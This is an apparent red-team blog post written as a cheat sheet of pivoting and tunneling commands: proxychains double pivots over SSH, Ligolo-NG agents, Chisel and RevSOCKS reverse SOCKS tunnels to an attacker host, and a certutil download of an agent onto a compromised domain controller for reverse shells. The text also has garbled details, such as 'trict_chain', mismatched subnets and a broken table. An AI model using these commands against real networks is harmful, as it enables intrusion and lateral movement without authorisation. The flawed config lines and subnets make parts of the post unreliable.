<!DOCTYPE html><html lang="en" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>Pivoting, Tunneling and Lateral Movement - Techniques | Disruption Blog</title><meta name="author" content="0xd1s"><meta name="copyright" content="0xd1s"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="ffffff"><meta name="description" content="Pivoting, Tunneling and Lateral Movement - TechniquesIf you want to scan ports with nmap using proxychains, the go to command is:proxychains nmap -sT -Pn -p 22 internal.server.local Since proxychains">
<meta property="og:type" content="article">
<meta property="og:title" content="Pivoting, Tunneling and Lateral Movement - Techniques">
<meta property="og:url" content="http://ischyr.github.io/2025/09/25/pivoting-tunneling-and-lateral-movement/index.html">
<meta property="og:site_name" content="Disruption Blog">
<meta property="og:description" content="Pivoting, Tunneling and Lateral Movement - TechniquesIf you want to scan ports with nmap using proxychains, the go to command is:proxychains nmap -sT -Pn -p 22 internal.server.local Since proxychains">
<meta property="og:locale" content="en_US">
<meta property="og:image" content="http://ischyr.github.io/2025/09/25/pivoting-tunneling-and-lateral-movement/pivoting-tunneling-and-lateral-movement.png">
<meta property="article:published_time" content="2025-09-25T15:07:44.000Z">
<meta property="article:modified_time" content="2025-09-25T15:21:45.553Z">
<meta property="article:author" content="0xd1s">
<meta property="article:tag" content="windows">
<meta property="article:tag" content="linux">
<meta property="article:tag" content="pivoting">
<meta property="article:tag" content="tunneling">
<meta property="article:tag" content="lateral movement">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="http://ischyr.github.io/2025/09/25/pivoting-tunneling-and-lateral-movement/pivoting-tunneling-and-lateral-movement.png"><script type="application/ld+json">{
  "@context": "https://schema.org",
  "@type": "BlogPosting",
  "headline": "Pivoting, Tunneling and Lateral Movement - Techniques",
  "url": "http://ischyr.github.io/2025/09/25/pivoting-tunneling-and-lateral-movement/",
  "image": "http://ischyr.github.io/2025/09/25/pivoting-tunneling-and-lateral-movement/pivoting-tunneling-and-lateral-movement.png",
  "datePublished": "2025-09-25T15:07:44.000Z",
  "dateModified": "2025-09-25T15:21:45.553Z",
  "author": [
    {
      "@type": "Person",
      "name": "0xd1s",
      "url": "http://ischyr.github.io/0xd1s"
    }
  ]
}</script><link rel="shortcut icon" href="/img/favicon.ico"><link rel="canonical" href="http://ischyr.github.io/2025/09/25/pivoting-tunneling-and-lateral-movement/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/node-snackbar/dist/snackbar.min.css" media="print" onload="this.media='all'"><script>
    (() => {
      
    const saveToLocal = {
      set: (key, value, ttl) => {
        if (!ttl) return
        const expiry = Date.now() + ttl * 86400000
        localStorage.setItem(key, JSON.stringify({ value, expiry }))
      },
      get: key => {
        const itemStr = localStorage.getItem(key)
        if (!itemStr) return undefined
        const { value, expiry } = JSON.parse(itemStr)
        if (Date.now() > expiry) {
          localStorage.removeItem(key)
          return undefined
        }
        return value
      }
    }

    window.btf = {
      saveToLocal,
      getScript: (url, attr = {}) => new Promise((resolve, reject) => {
        const script = document.createElement('script')
        script.src = url
        script.async = true
        Object.entries(attr).forEach(([key, val]) => script.setAttribute(key, val))
        script.onload = script.onreadystatechange = () => {
          if (!script.readyState || /loaded|complete/.test(script.readyState)) resolve()
        }
        script.onerror = reject
        document.head.appendChild(script)
      }),
      getCSS: (url, id) => new Promise((resolve, reject) => {
        const link = document.createElement('link')
        link.rel = 'stylesheet'
        link.href = url
        if (id) link.id = id
        link.onload = link.onreadystatechange = () => {
          if (!link.readyState || /loaded|complete/.test(link.readyState)) resolve()
        }
        link.onerror = reject
        document.head.appendChild(link)
      }),
      addGlobalFn: (key, fn, name = false, parent = window) => {
        if (!false && key.startsWith('pjax')) return
        const globalFn = parent.globalFn || {}
        globalFn[key] = globalFn[key] || {}
        globalFn[key][name || Object.keys(globalFn[key]).length] = fn
        parent.globalFn = globalFn
      }
    }
  
      
      const activateDarkMode = () => {
        document.documentElement.setAttribute('data-theme', 'dark')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
        }
      }
      const activateLightMode = () => {
        document.documentElement.setAttribute('data-theme', 'light')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', 'ffffff')
        }
      }

      btf.activateDarkMode = activateDarkMode
      btf.activateLightMode = activateLightMode

      const theme = saveToLocal.get('theme')
    
          theme === 'dark' ? activateDarkMode() : theme === 'light' ? activateLightMode() : null
        
      
      const asideStatus = saveToLocal.get('aside-status')
      if (asideStatus !== undefined) {
        document.documentElement.classList.toggle('hide-aside', asideStatus === 'hide')
      }
    
      
    const detectApple = () => {
      if (/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)) {
        document.documentElement.classList.add('apple')
      }
    }
    detectApple()
  
    })()
  </script><script>const GLOBAL_CONFIG = {
  root: '/',
  algolia: undefined,
  localSearch: undefined,
  translate: undefined,
  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false,"highlightFullpage":false,"highlightMacStyle":false},
  copy: {
    success: 'Copy Successful',
    error: 'Copy Failed',
    noSupport: 'Browser Not Supported'
  },
  relativeDate: {
    homepage: false,
    post: false
  },
  runtime: '',
  dateSuffix: {
    just: 'Just now',
    min: 'minutes ago',
    hour: 'hours ago',
    day: 'days ago',
    month: 'months ago'
  },
  copyright: undefined,
  lightbox: 'null',
  Snackbar: {"chs_to_cht":"You have switched to Traditional Chinese","cht_to_chs":"You have switched to Simplified Chinese","day_to_night":"You have switched to Dark Mode","night_to_day":"You have switched to Light Mode","bgLight":"#49b1f5","bgDark":"#1f1f1f","position":"bottom-left"},
  infinitegrid: {
    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid/dist/infinitegrid.min.js',
    buttonText: 'Load More'
  },
  isPhotoFigcaption: false,
  islazyloadPlugin: false,
  isAnchor: false,
  percent: {
    toc: true,
    rightside: true,
  },
  autoDarkmode: false
}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
  title: 'Pivoting, Tunneling and Lateral Movement - Techniques',
  isHighlightShrink: false,
  isToc: true,
  pageType: 'post'
}</script><meta name="generator" content="Hexo 7.3.0"></head><body><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img text-center"><img src="/img/avatar.png" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="site-data text-center"><a href="/archives/"><div class="headline">Articles</div><div class="length-num">7</div></a><a href="/tags/"><div class="headline">Tags</div><div class="length-num">9</div></a><a href="/categories/"><div class="headline">Categories</div><div class="length-num">4</div></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> Archives</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> Tags</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> Categories</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> About</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url(../pivoting-tunneling-and-lateral-movement/pivoting-tunneling-and-lateral-movement.png);"><nav id="nav"><span id="blog-info"><a class="nav-site-title" href="/"><span class="site-name">Disruption Blog</span></a><a class="nav-page-title" href="/"><span class="site-name">Pivoting, Tunneling and Lateral Movement - Techniques</span></a></span><div id="menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> Archives</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> Tags</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> Categories</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> About</span></a></div></div><div id="toggle-menu"><span class="site-page"><i class="fas fa-bars fa-fw"></i></span></div></div></nav><div id="post-info"><h1 class="post-title">Pivoting, Tunneling and Lateral Movement - Techniques</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">Created</span><time class="post-meta-date-created" datetime="2025-09-25T15:07:44.000Z" title="Created 2025-09-25 18:07:44">2025-09-25</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">Updated</span><time class="post-meta-date-updated" datetime="2025-09-25T15:21:45.553Z" title="Updated 2025-09-25 18:21:45">2025-09-25</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/red-teaming/">red teaming</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title=""><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">Post Views:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="container post-content" id="article-container"><h1 id="Pivoting-Tunneling-and-Lateral-Movement-Techniques"><a href="#Pivoting-Tunneling-and-Lateral-Movement-Techniques" class="headerlink" title="Pivoting, Tunneling and Lateral Movement - Techniques"></a>Pivoting, Tunneling and Lateral Movement - Techniques</h1><p>If you want to scan ports with nmap using proxychains, the go to command is:<br><code>proxychains nmap -sT -Pn -p 22 internal.server.local</code></p>
<p>Since proxychains allows just direct TCP connect scans.</p>
<h2 id="Local-Port-Forwarding-Remote-Port-Forwarding"><a href="#Local-Port-Forwarding-Remote-Port-Forwarding" class="headerlink" title="Local Port Forwarding &amp; Remote Port Forwarding"></a>Local Port Forwarding &amp; Remote Port Forwarding</h2><h3 id="Local-Port-Forwarding"><a href="#Local-Port-Forwarding" class="headerlink" title="Local Port Forwarding"></a>Local Port Forwarding</h3><p><code>ssh -L [bindaddr]:[port]:[dsthost]:[dstport] [user]@[host]</code></p>
<h3 id="Remote-Port-Forwarding"><a href="#Remote-Port-Forwarding" class="headerlink" title="Remote Port Forwarding"></a>Remote Port Forwarding</h3><p><code>ssh -R [bindaddr]:[port]:[localhost]:[localport] [user]@[host]</code></p>
<h2 id="Resources"><a href="#Resources" class="headerlink" title="Resources"></a>Resources</h2><ul>
<li><a target="_blank" rel="noopener" href="https://swisskyrepo.github.io/InternalAllTheThings/redteam/pivoting/network-pivoting-techniques/#graftcp">https://swisskyrepo.github.io/InternalAllTheThings/redteam/pivoting/network-pivoting-techniques/#graftcp</a></li>
</ul>
<h2 id="Double-Pivoting-using-SSH-and-ProxyChains4"><a href="#Double-Pivoting-using-SSH-and-ProxyChains4" class="headerlink" title="Double Pivoting using SSH and ProxyChains4"></a>Double Pivoting using SSH and ProxyChains4</h2><p>Resource: <a target="_blank" rel="noopener" href="https://theyhack.me/Proxychains-Double-Pivoting/">https://theyhack.me/Proxychains-Double-Pivoting/</a></p>
<h3 id="The-Layout"><a href="#The-Layout" class="headerlink" title="The Layout"></a>The Layout</h3><table>
<thead>
<tr>
<th>IP</th>
<th>Hostname</th>
<th>Notes</th>
</tr>
</thead>
<tbody><tr>
<td>192.168.122.125</td>
<td><code>attack</code></td>
<td>My box</td>
</tr>
<tr>
<td>192.168.122.172</td>
<td><code>jumpbox1.local</code></td>
<td>First jump box</td>
</tr>
<tr>
<td>192.168.122.212</td>
<td><code>jumpbox2.local</code></td>
<td>Second jump box</td>
</tr>
<tr>
<td>192.168.122.181</td>
<td><code>destbox.local</code></td>
<td>Final machine</td>
</tr>
</tbody></table>
<p>This is how the environment looks like:</p>


<p>You can use your imagination on what <code>jumpbox1.local</code>, <code>jumpbox2.local</code>, and <code>destbox.local</code> are… Webserver, fileserver, privileged workstation, DC. Important thing to know is:</p>
<ul>
<li><code>attack</code> can only talk to <code>jumpbox1.local</code></li>
<li><code>jumpbox1.local</code> can only talk to <code>jumpbox2.local</code></li>
<li><code>jumpbox2.local</code> can only talk to <code>destbox.local</code></li>
</ul>
<h3 id="Connecting-to-the-first-machine"><a href="#Connecting-to-the-first-machine" class="headerlink" title="Connecting to the first machine:"></a>Connecting to the first machine:</h3><p><code>they@attack.local:~$ ssh -f -N -D 127.0.0.1:8888 user@jumpbox1.local</code></p>
<p>What each flag does:</p>
<table>
<thead>
<tr>
<th>Flag</th>
<th>Explanation</th>
</tr>
</thead>
<tbody><tr>
<td><code>-f</code></td>
<td>This sends the command to background right before executing a command remotely (think <code>command &amp;</code>)</td>
</tr>
<tr>
<td><code>-N</code></td>
<td>This tells <code>ssh</code> not to execute a command remotely. We are just establishing a tunnel&#x2F;proxy, no need to execute a command.</td>
</tr>
<tr>
<td><code>-D</code></td>
<td>This tells <code>ssh</code></td>
</tr>
<tr>
<td>to establish a local dynamic application-level port forwarding. This is</td>
<td></td>
</tr>
<tr>
<td>the local port we will send our requests to IE where our SOCKS proxy</td>
<td></td>
</tr>
<tr>
<td>exists</td>
<td></td>
</tr>
</tbody></table>
<p>Once we have a SOCKS proxy established, we can then use <code>proxychains4</code> to communicate over the newly established tunnel&#x2F;proxy. I make a local config file to use.</p>
<p>→ proxychains4.conf file:</p>
<figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">strict_chain </span><br><span class="line">quiet_mode</span><br><span class="line">proxy_dns</span><br><span class="line">remote_dns_subnet <span class="number">224</span></span><br><span class="line">tcp_read_time_out <span class="number">15000</span></span><br><span class="line">tcp_connect_time_out <span class="number">8000</span></span><br><span class="line">localnet <span class="number">127.0</span><span class="number">.0</span><span class="number">.0</span>/<span class="number">255.0</span><span class="number">.0</span><span class="number">.0</span></span><br><span class="line"> </span><br><span class="line">[<span class="title class_">ProxyList</span>]</span><br><span class="line">socks4  <span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span> <span class="number">8888</span></span><br></pre></td></tr></table></figure>

<p>Now we will do the same thing on <code>jumpbox2</code>:<br><code>they@attack.local:~$ proxychains4 -f ~/new-proxychains.conf ssh -f -N -D 127.0.0.1:9999 user@jumpbox2.local</code></p>
<p>Now we will need to modify our configuration file again:</p>
<figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">trict_chain # dynamic_chain would work <span class="keyword">as</span> well</span><br><span class="line">quiet_mode</span><br><span class="line">proxy_dns</span><br><span class="line">remote_dns_subnet <span class="number">224</span></span><br><span class="line">tcp_read_time_out <span class="number">15000</span></span><br><span class="line">tcp_connect_time_out <span class="number">8000</span></span><br><span class="line">localnet <span class="number">127.0</span><span class="number">.0</span><span class="number">.0</span>/<span class="number">255.0</span><span class="number">.0</span><span class="number">.0</span></span><br><span class="line"> </span><br><span class="line">[<span class="title class_">ProxyList</span>]</span><br><span class="line">socks4  <span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span> <span class="number">8888</span></span><br><span class="line">socks4  <span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span> <span class="number">9999</span> # <span class="title class_">From</span> jumpbox1.<span class="property">local</span> to jumpbox2.<span class="property">local</span> via <span class="variable language_">this</span> command you <span class="attr">ran</span>: they@jumpbox1.<span class="property">local</span>:~$ ssh -f -N -D <span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">9999</span> user@jumpbox2.<span class="property">local</span></span><br></pre></td></tr></table></figure>

<p>Notice the second line is port <code>9999</code>? That is because proxychains is first going to proxy through <code>127.0.0.1:8888</code> on our box to <code>jumpbox1.local</code>, then it is going to proxy through <code>127.0.0.1:9999</code> on <code>jumpbox1.local</code> to <code>jumpbox2.local</code>.<br><code>proxychains4</code> is going to try to use each proxy in the order listed. Since we have <code>strict_chain</code> in our config, if one fails then <code>proxychains</code> won’t continue. Not applicable here, but you could do <code>dynamic_chain</code> and if one failed, it would move on to try the next. In our use case, either <code>strict_chain</code> or <code>dynamic_chain</code> works fine.</p>
<p>Basically we need to do the following thing:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Pivot 1 using proxychains</span></span><br><span class="line">ssh -D 1080 user@IP_Network1</span><br><span class="line"></span><br><span class="line"><span class="comment"># Configure /etc/proxychains to set port 1080</span></span><br><span class="line"><span class="comment"># Pivot 2 using proxychains</span></span><br><span class="line">proxychains ssh -D 1081 user@IP_Network2</span><br><span class="line"></span><br><span class="line"><span class="comment"># Configure /etc/proxychains to set port 1081</span></span><br><span class="line"></span><br><span class="line">proxychains nmap...</span><br></pre></td></tr></table></figure>

<h2 id="Double-Pivoting-using-Ligolo-NG"><a href="#Double-Pivoting-using-Ligolo-NG" class="headerlink" title="Double Pivoting using Ligolo-NG"></a>Double Pivoting using Ligolo-NG</h2><p><a target="_blank" rel="noopener" href="https://infod33p4k.github.io/posts/blog/ligolo-ng/">https://infod33p4k.github.io/posts/blog/ligolo-ng/</a></p>
<p>This is how the environment looks like:</p>
<img src="/2025/09/25/pivoting-tunneling-and-lateral-movement/image.png" class="">

<p>On our kali machine firstly we will need to add the ligolo interface:</p>
<figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo ip tuntap add user kali mode tun ligolo</span><br><span class="line">sudo ip link set ligolo up</span><br></pre></td></tr></table></figure>

<p>And now we will need to start the ligolo: <code>./proxy -selfcert</code> ( and we can see it’s listening on the 11601 port )</p>
<p>Now on the first machine that we have access we need to do the following command:</p>
<figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./agent -connect <span class="attr">kali_ip</span>:<span class="number">11601</span> -ignore-cert</span><br></pre></td></tr></table></figure>

<p>Inside of the ligolo instance we will need to run the command: <code>session</code> and pick the agent that just connected. From this we can run commands like <code>ifconfig</code> and see the interface we are interested in. In our case we are interested in the internal interface, so after identifying the interface and subnet we will need to add this to our ligolo interface: <code>sudo ip route add 10.10.8.0/24 dev ligolo</code></p>
<p>Now from our kali machine we can scan this network but before doing this inside of the ligolo instance we will need to run the command: <code>start</code> and now we can scan the subnet from our kali machine.</p>
<h3 id="Starting-the-Double-Pivot"><a href="#Starting-the-Double-Pivot" class="headerlink" title="Starting the Double Pivot"></a>Starting the Double Pivot</h3><p>Now that we can interact with the systems from the internal network ( in this case the 3rd machine ) - we will need to download again the ligolo agent in one of those machines from the <code>10.10.8.0/24</code> subnet so we will be able to interact with the machines from the <code>172.160.0.0/24</code> range.</p>
<p>Before doing this we will need to setup the 2nd interface: <code>sudo ip tuntap add user kali mode tun ligolo-double</code> &amp; <code>sudo ip link set ligolo-double up</code></p>
<p>Now in order to setup the agent we will need to do some stuff beforehand:</p>
<ol>
<li>Create a listener: <code>listener_add --addr 0.0.0.0:11601 --to 127.0.0.1:11601 --tcp</code> ( on ligolo )</li>
</ol>
<p>This listener will be created on the first machine that we pwned ( 10.10.8.9 ) - and the agent from the 3rd machine will connect back to the 2nd machine and the 2nd machine will forward the traffic to our local machine ( kali ).</p>
<ol>
<li>In order to check the listeners we can do: <code>listener_list</code></li>
<li>Once we have done this, on the 3rd machine we will start the agent: <code>./agent -connect 10.10.8.9:11601 -ignore-cert</code></li>
</ol>
<p>Type again <code>session</code> on ligolo, pick the session we just got from the 3rd machine, type ifconfig and add the route to the interface: <code>sudo ip route add 172.16.0.0/24 dev ligolo-double</code> and type <code>tunnel_start --tun ligolo_double</code> . And you can do this again and again if you want to continue pivoting on more machines that have different subnets.</p>
<h3 id="Performing-File-Transfers-and-Reverse-Shells"><a href="#Performing-File-Transfers-and-Reverse-Shells" class="headerlink" title="Performing File Transfers and Reverse Shells"></a>Performing File Transfers and Reverse Shells</h3><p>This is how the environment looks like:</p>
<img src="/2025/09/25/pivoting-tunneling-and-lateral-movement/image_1.png" class="">

<p>We currently have just a ligolo agent running on the Ubuntu host ( for the internal network: 10.10.8.0&#x2F;24 ).</p>
<p>Now we will also pwn the DC2 machine and run the agent on it so we can have access on the 127.16.0.0&#x2F;24 subnet. But before doing this, on ligolo we will need to run the following commands:</p>
<figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">listener_add --addr <span class="number">0.0</span><span class="number">.0</span><span class="number">.0</span>:<span class="number">11601</span> --to <span class="number">0.0</span><span class="number">.0</span><span class="number">.0</span>:<span class="number">11601</span> ( <span class="variable language_">this</span> will send the traffic to our local kali machine <span class="keyword">from</span> the <span class="title class_">DC2</span> -&gt; ubuntu host -&gt; kali )</span><br><span class="line">listener_add --addr <span class="number">0.0</span><span class="number">.0</span><span class="number">.0</span>:<span class="number">2000</span> --to <span class="number">0.0</span><span class="number">.0</span><span class="number">.0</span>:<span class="number">31337</span> ( <span class="variable language_">this</span> will be our python http.<span class="property">server</span>: <span class="number">10.10</span><span class="number">.8</span><span class="number">.9</span>:<span class="number">2000</span> will forward the traffic to localhost on <span class="number">31337</span> )</span><br></pre></td></tr></table></figure>

<p>Now once we are inside of the DC2 - we can run our ligolo agent: <code>./agent -connect 10.10.8.9:11601 -ignore-cert</code></p>
<p>But in order to do this, we will need to download the agent - so to do this we can do <code>certutil.exe -urlcache -split -f [http://10.10.8.9:2000/agent.exe](http://10.10.8.9:2000/agent.exe) agent.exe</code></p>
<h3 id="Catching-the-Reverse-Shell"><a href="#Catching-the-Reverse-Shell" class="headerlink" title="Catching the Reverse Shell"></a>Catching the Reverse Shell</h3><p>When we are creating the reverse shell we will set the LHOST of the payload to the first machine:</p>
<img src="/2025/09/25/pivoting-tunneling-and-lateral-movement/image_2.png" class="">

<p>And on the listening part we will do the following:</p>
<img src="/2025/09/25/pivoting-tunneling-and-lateral-movement/image_3.png" class="">

<p>And we will create another ligolo listener: <code>listener_add --addr 0.0.0.0:1111 --to 0.0.0.0:40000</code></p>
<h3 id="Accessing-Localhost-Ports"><a href="#Accessing-Localhost-Ports" class="headerlink" title="Accessing Localhost Ports"></a>Accessing Localhost Ports</h3><p>In order to access the local ports - ligolo assigned the entire 240.0.0.0&#x2F;4 subnet.</p>
<p>To do this we will add another interface and start it:</p>
<figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">sudo ip tuntap add user kali mode tun ligolo-localhost</span><br><span class="line">sudo ip link set ligolo-localhost up</span><br><span class="line">sudo ip route add <span class="number">172.16</span><span class="number">.0</span><span class="number">.0</span>/<span class="number">24</span> dev ligolo-<span class="title function_">localhost</span> ( add firstly the normal subnet )</span><br><span class="line">sudo ip route add <span class="number">240.0</span><span class="number">.0</span><span class="number">.5</span>/<span class="number">32</span> dev ligolo-localhost</span><br><span class="line"></span><br><span class="line">nmap -<span class="title class_">Pn</span> <span class="number">240.0</span><span class="number">.0</span><span class="number">.5</span> -p5000</span><br></pre></td></tr></table></figure>

<h3 id="Ligolo-Builtin-Commands"><a href="#Ligolo-Builtin-Commands" class="headerlink" title="Ligolo Builtin Commands"></a>Ligolo Builtin Commands</h3><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">interface_create --name <span class="title class_">Internal</span></span><br><span class="line">route_add --name <span class="title class_">Internal</span> --route <span class="number">192.168</span><span class="number">.2</span><span class="number">.0</span>/<span class="number">24</span></span><br><span class="line">tunnel_start --tun <span class="title class_">Internal</span></span><br></pre></td></tr></table></figure>

<h2 id="Chisel"><a href="#Chisel" class="headerlink" title="Chisel"></a>Chisel</h2><h3 id="Reverse-SOCKS-Proxy"><a href="#Reverse-SOCKS-Proxy" class="headerlink" title="Reverse SOCKS Proxy"></a>Reverse SOCKS Proxy</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"># Attacking Machine</span><br><span class="line">./chisel server -p &lt;Port&gt; --reverse &amp;</span><br><span class="line">./chisel server -p 1337 --reverse &amp;</span><br><span class="line"></span><br><span class="line"># On Target Machine</span><br><span class="line">./chisel client &lt;Attacking-IP&gt;:&lt;Port&gt; R:socks &amp;</span><br><span class="line">./chisel client 10.50.46.8:1337 R:socks &amp;</span><br><span class="line"></span><br><span class="line"># Then use Proxychains to scan internal networks from the compromised host.</span><br></pre></td></tr></table></figure>

<h2 id="RevSOCKS"><a href="#RevSOCKS" class="headerlink" title="RevSOCKS"></a>RevSOCKS</h2><h3 id="How-to-Build-for-Linux"><a href="#How-to-Build-for-Linux" class="headerlink" title="How to Build for Linux"></a>How to Build for Linux</h3><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"># <span class="title class_">Build</span> <span class="keyword">for</span> <span class="title class_">Linux</span></span><br><span class="line">git clone <span class="attr">https</span>:<span class="comment">//github.com/kost/revsocks</span></span><br><span class="line"><span class="keyword">export</span> <span class="variable constant_">GOPATH</span>=~/go</span><br><span class="line">go get github.<span class="property">com</span>/hashicorp/yamux</span><br><span class="line">go get github.<span class="property">com</span>/armon/go-socks5</span><br><span class="line">go get github.<span class="property">com</span>/kost/go-ntlmssp</span><br><span class="line">go build</span><br><span class="line">go build -ldflags=<span class="string">&quot;-s -w&quot;</span> &amp;&amp; upx --brute revsocks</span><br><span class="line"></span><br><span class="line"># <span class="title class_">Build</span> <span class="keyword">for</span> <span class="title class_">Windows</span></span><br><span class="line">go get github.<span class="property">com</span>/hashicorp/yamux</span><br><span class="line">go get github.<span class="property">com</span>/armon/go-socks5</span><br><span class="line">go get github.<span class="property">com</span>/kost/go-ntlmssp</span><br><span class="line"><span class="variable constant_">GOOS</span>=windows <span class="variable constant_">GOARCH</span>=amd64 go build -ldflags=<span class="string">&quot;-s -w&quot;</span></span><br><span class="line">go build -ldflags -H=windowsgui</span><br><span class="line">upx revsocks</span><br></pre></td></tr></table></figure>

<h3 id="Usage-Commands"><a href="#Usage-Commands" class="headerlink" title="Usage Commands"></a>Usage Commands</h3><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"># <span class="title class_">Listen</span> on the server and create a <span class="variable constant_">SOCKS</span> <span class="number">5</span> proxy on port <span class="number">1080</span></span><br><span class="line">user@<span class="variable constant_">VPS</span>$ ./revsocks -listen :<span class="number">8443</span> -socks <span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">1080</span> -pass <span class="title class_">Password1234</span></span><br><span class="line"></span><br><span class="line"># <span class="title class_">Connect</span> client to the server</span><br><span class="line">user@<span class="variable constant_">PC</span>$ ./revsocks -connect <span class="number">10.10</span><span class="number">.10</span><span class="number">.10</span>:<span class="number">8443</span> -pass <span class="title class_">Password1234</span></span><br><span class="line">user@<span class="variable constant_">PC</span>$ ./revsocks -connect <span class="number">10.10</span><span class="number">.10</span><span class="number">.10</span>:<span class="number">8443</span> -pass <span class="title class_">Password1234</span> -proxy proxy.<span class="property">domain</span>.<span class="property">local</span>:<span class="number">3128</span> -proxyauth <span class="title class_">Domain</span>/<span class="attr">userpame</span>:userpass -useragent <span class="string">&quot;Mozilla 5.0/IE Windows 10&quot;</span></span><br></pre></td></tr></table></figure>

<h2 id="Neo-reGeorg-Web-SOCKS"><a href="#Neo-reGeorg-Web-SOCKS" class="headerlink" title="Neo-reGeorg - Web SOCKS"></a>Neo-reGeorg - Web SOCKS</h2><p>Resource: <a target="_blank" rel="noopener" href="https://github.com/L-codes/Neo-reGeorg/blob/master/README-en.md">https://github.com/L-codes/Neo-reGeorg/blob/master/README-en.md</a></p>
